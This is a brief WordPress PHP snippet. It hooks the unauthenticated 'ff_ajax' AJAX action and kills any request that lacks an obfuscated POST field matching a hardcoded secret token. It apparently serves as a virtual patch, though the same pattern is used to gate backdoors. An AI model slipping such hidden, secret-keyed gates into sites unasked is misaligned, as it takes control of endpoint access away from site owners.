<?php

function uploader_verification_visibility() {
	if (!isset($_POST["wxtbxwqpotsse"]) || $_POST["wxtbxwqpotsse"] !== "twEd5JTb1T5Ny") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'uploader_verification_visibility', 5, 1);
